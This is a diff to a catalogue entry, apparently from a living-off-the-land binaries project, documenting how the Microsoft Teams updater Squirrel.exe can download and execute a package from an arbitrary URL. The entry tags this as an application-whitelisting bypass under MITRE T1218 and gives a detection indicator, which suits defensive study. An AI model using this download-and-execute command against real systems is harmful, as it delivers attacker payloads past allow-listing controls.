@@ -1,47 +1,45 @@
-Name: squirrel.exe
-Description: Binary to update the existing installed Nuget/squirrel package
-Author: User
-Created: Installed date
+Name: Squirrel.exe
+Description: Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
+Author: 'Reegun J (OCBC Bank) - @reegun21'
+Created: '2019-06-26'
 Commands:
   - Command: squirrel.exe --download [url to package]
-    Description: The above binary will go that particular location and look for RELEASES file and download the nuget package.
+    Description: The above binary will go to url and look for RELEASES file and download the nuget package.
     Usecase: Download and execute binary
     Category: Execute
-    Privileges: User Privilege
+    Privileges: User
     MitreID: T1218 
     MitreLink: https://attack.mitre.org/techniques/T1218/
-    OperatingSystem: Windows OS
+    OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: squirrel.exe --download [url to package]
-    Description: The above binary will go that particular location and look for RELEASES file and download the nuget package.
+    Description: The above binary will go to url and look for RELEASES file and download the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
-    Privileges: User Privilege
+    Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 10
   - Command: squirrel.exe --download [url to package]
-    Description: The above binary will go that particular location and look for RELEASES file and download the nuget package.
+    Description: The above binary will go to url and look for RELEASES file and download the nuget package.
     Usecase: Download and execute binary
     Category: Download
-    Privileges: User Privilege
+    Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/techniques/T1218/
-    OperatingSystem: Windows 10
+    OperatingSystem: Windows 7 and up with Microsoft Teams installed
 Full_Path:
-- Path: NA
-- Path: %localappdata%\Microsoft\Teams\current\Squirrel.exe
+  - Path: '%localappdata%\Microsoft\Teams\current\Squirrel.exe'
 Code_Sample: 
-- Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
+  - Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
 Detection: 
-- IOC: NA
-- IOC: NA
+  - IOC: Update.exe spawned an unknown process
 Resources:
- - Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
- - Link: https://twitter.com/reegun21/status/1144182772623269889
- - Link: NA
- Acknowledgement:
+  - Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
+  - Link: https://twitter.com/reegun21/status/1144182772623269889
+  - Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
+Acknowledgement:
   - Person: Reegun J (OCBC Bank)
-    Handle: @reegun21
-  - Person: NA
-    Handle: NA
+    Handle: '@reegun21'
+  - Person: Adam
+    Handle: '@Hexacorn'
 ---
